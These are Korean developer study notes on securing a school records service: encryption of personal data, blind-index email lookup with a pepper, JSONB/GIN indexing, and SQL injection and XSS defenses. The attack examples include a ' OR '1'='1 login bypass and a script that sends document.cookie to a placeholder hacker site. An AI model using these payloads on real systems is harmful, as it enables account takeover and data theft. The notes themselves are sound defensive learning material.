보안 설계. PII(개인식별정보)를 우선 암호화. 
암호화 방식 2가지
단방향(hash): 대상칼럼은 password_hash, 방식은 bcrypt, 특징은 복호화 불가능. 로그인 시 입력값과 헤시값만 비교 
양방향 (Encryption): 대상칼럼은 email, name, phone, 방식은 aes-256, 키(Key)를 통해 복호화가 가능합니다. 화면에 출력하거나 연락을 취할 때 원문이 필요하기 때문입니다.

unique란 이 컬럼에는 중복된 값이 들어올 수 없다. db는 인덱스를 자동으로 생성해서 이메일로 사용자 조회가 빨라진다.
지금 email에 unique 걸려있는데 aes-256 암호화를 했다. 그럼 조회가 가능한가?
aes-256 GCM 암호화도 하고, sha-256 해시 컬럼을 별도로 둬서, 그 컬럼으로 중복 체크, 로그인 조회. 화면에 표시하는 건 aes 암호화된 거 복호화.

aes-256-GCM은 인증태그 붙어서 수정되면 오염여부 파악가능. AEAD(Authenticated Encryption with Associated Data) 라고 부름

발표: "AES-256-GCM은 랜덤 IV를 사용하는 비결정적 암호화라 같은 값을 암호화해도 결과가 매번 다릅니다. 따라서 암호화된 컬럼에 UNIQUE 제약을 걸면 동작하지 않습니다. 이를 해결하기 위해 평문 이메일의 SHA-256 해시를 별도
컬럼(email_hash)에 저장하고 여기에 UNIQUE 제약을 적용했습니다. 조회시에도 입력값을 SHA-256으로 해시한 후 email_hash로 검색합니다."

비밀번호 해싱은 무작위 salt -> 사용자 비번이 같아도 해시값이 다르다.
이메일 해싱은 검색을 위해 결과가 항상 동일해야한다. 그래서 추정 가능.

Salt가 없는 경우 (Deterministic):
장점: 동일한 이메일은 항상 동일한 해시값을 가집니다. 덕분에 지금처럼 UNIQUE 인덱스를 통한 검색이 완벽하게 작동합니다.
단점: 레인보우 테이블 공격에 취약합니다. 공격자가 유출된 해시값들을 미리 계산된 이메일 해시 목록과 대조하면 원문 이메일을 알아낼 수 있습니다.
고정된 Pepper(페퍼) 사용 (권장):
보통 Blind Index에서는 각 레코드마다 다른 Salt를 쓰면 검색이 불가능해지므로, **애플리케이션 설정 파일(.env)에 저장된 고정된 비밀 키(Pepper)**를 원문과 합쳐서 해싱합니다.
hash = sha256(email + secret_pepper)

이렇게 하면 DB만 털려서는 원문을 유추할 수 없고, 애플리케이션 코드까지 함께 털려야 하므로 보안성이 훨씬 높아집니다.

  방식별 비교

  1. Tokenization (토큰화)

  이메일 원문 → 랜덤 토큰(UUID) → DB에 토큰만 저장
  원문은 별도 Vault 서버에 보관

  장점: DB에 PII가 전혀 없음. DB 털려도 이메일 없음. 가장 강력.

  단점:
  - Vault 서버가 별도 인프라로 필요 (HashiCorp Vault 등)
  - 로그인마다 Vault 네트워크 왕복 필요 → 레이턴시 증가
  - Vault 다운 = 로그인 불가 → 단일 장애점

  적합한 곳: 카드번호(PCI-DSS), 의료정보(HIPAA). 규제가 강하고 인프라 투자
  가능한 곳.

  학교 시스템에 적합한가: 오버킬. 인프라 복잡도 대비 실익이 적음.

  ---
  2. KMS + Envelope Encryption

  AWS KMS → Data Encryption Key(DEK) 생성
  DEK로 이메일 암호화
  KMS Master Key로 DEK 암호화
  DB에: 암호화된 DEK + 암호화된 이메일 저장

  장점:
  - 키 관리를 AWS KMS가 담당 → 앱 메모리에 마스터 키 없음
  - KMS는 CloudTrail로 모든 복호화 요청 감사 로그 남김
  - 키 로테이션 자동화 가능

  단점:
  - 이메일로 검색하는 문제는 해결 안 됨 (암호화는 여전히 비결정적)
  - HMAC blind index는 별도로 여전히 필요
  - KMS API 호출 비용 + 레이턴시 (수십 ms)
  - 설계 복잡도 증가

  학교 시스템에 적합한가: HMAC 키를 KMS로 관리하면 pepper 노출 위험이 크게
  줄어. 현실적으로 가장 강한 선택지이나 구현 복잡도 있음.

  ---
  3. AES-256 + HMAC-SHA256 with pepper (Parameter Store)

  이메일 저장: AES-256-GCM (현재 구현, 비결정적)
  이메일 검색: HMAC-SHA256(pepper, email) → blind index
  pepper: Parameter Store SecureString (KMS 암호화)

  장점:
  - 업계 표준 수준
  - 추가 인프라 없음 (Parameter Store 이미 사용 중)
  - 빠름 (로컬 연산)
  - DB만 털려서는 레인보우 테이블 불가

  단점:
  - DB + Parameter Store 동시 탈취 시 대입 공격 가능
  - 앱 실행 중 메모리 덤프로 pepper 노출 가능

  학교 시스템에 적합한가: 현재 규모와 위협 수준에서 실용적 최선.

  ---
  이 서비스에서 베스트는?

  현재 구현       나쁨    plain SHA-256, 레인보우 테이블 취약
  ─────────────────────────────────────────────────

JSONB 쿼리 기능이란?
일반적인 데이터베이스는 한 컬럼에 하나의 값만 들어가지만, JSONB는 컬럼 하나에 트리 구조의 복잡한 데이터를 통째로 넣고, 그 내부 값을 SQL로 직접 조회하는 기능입니다.

GIN (Generalized Inverted Index) 인덱스란?
일반적인 B-Tree 인덱스가 "단어 하나"를 찾는다면, GIN 인덱스는 **"내용물 전체"**를 낱낱이 쪼개서 인덱스를 만듭니다.

작동 원리: JSON 내부에 어떤 키(Key)와 값(Value)이 들어있는지 전부 지도로 그려둡니다.

효과: 데이터가 수만 건이 넘어가도 JSON 내부의 특정 항목을 찾는 속도가 비약적으로 빨라집니다. GIN 인덱스가 없다면 DB는 모든 행을 다 열어봐야 하는 Full Table Scan을 하게 되어 시스템이 느려집니다.

  student_id, year, semester, category — 전부 일반 컬럼으로만 필터링하고
  있어. JSONB 내부를 SQL에서 들여다보는 쿼리가 단 하나도 없어.

  content 컬럼은 그냥 꺼내서 앱에 통째로 반환하는 용도로만 쓰임.

  V1 SQL에 만들어둔 GIN 인덱스도 실제로는 한 번도 안 쓰이고 있어:

  -- 이게 있는데 실제로 활용되는 쿼리가 없음
  CREATE INDEX idx_student_records_content ON student_records USING GIN

# SQL injection/XSS 대응

### SQL injection
사용자가 입력창에 아이디/비밀번호 대신 악의적인 SQL 구문을 넣어서 개발자가 의도하지 않은 DB 명령을 실행하게 만드는 공격

ex) 로그인 창 아이디에 ' OR '1'='1을 입력함.

결과: SQL문이 SELECT * FROM users WHERE id = '' OR '1'='1'이 되어버려, 비밀번호 없이 모든 사용자 정보가 털리거나 DB가 삭제될 수 있다.

Prepared Statement(파라미터 쿼리) 사용해서, 사용자의 입력을 SQL 명령어가 아닌 단순한 텍스트로 취급하게 만든다.
ORM 사용해서 JAP나 TypeORM 등을 사용하면, 기본적으로 Prepared Statement를 활용하므로 SQL injection 방어 가능.
입력값 검증: 학번 입력창에 숫자가 아닌 특수문자가 들어오면 입구컷 시키기.

## XSS (Cross-site scripting)
게시판이나 댓글창에 악의적인 자바스크립트코드를 삽입하는 공격. 이 코드가 db에 저장이 되어있으면, 다른 사용자가 그 글을 읽을 때 브라우저에서 실행이 됨.
공격 예시: 게시글 제목에 <script>document.location='http://해커사이트.com?cookie='+document.cookie</script> 입력.
결과: 해당 글을 클릭한 일반 사용자의 세션쿠키가 해커에게 전송되어 계정을 탈취당한다.

대응방안
HTML Escape (특수문자 치환): <를 &lt;, >를 &gt;로 바꿔서 브라우저가 코드로 인식하지 못하게 만듭니다. (Spring Boot의 Thymeleaf나 React 같은 모던 프레임워크는 이걸 자동으로 해줍니다.)

내용 검증 (XSS Filter): 네이버 스마트 에디터처럼 HTML 태그를 허용해야 하는 경우, 루시(Lucy) XSS Filter 같은 라이브러리를 써서 위험한 태그(script, object 등)만 골라내서 제거합니다.

CSP (Content Security Policy) 설정: 브라우저 헤더에 "지정한 도메인 외의 스크립트는 실행하지 마!"라고 선언합니다.
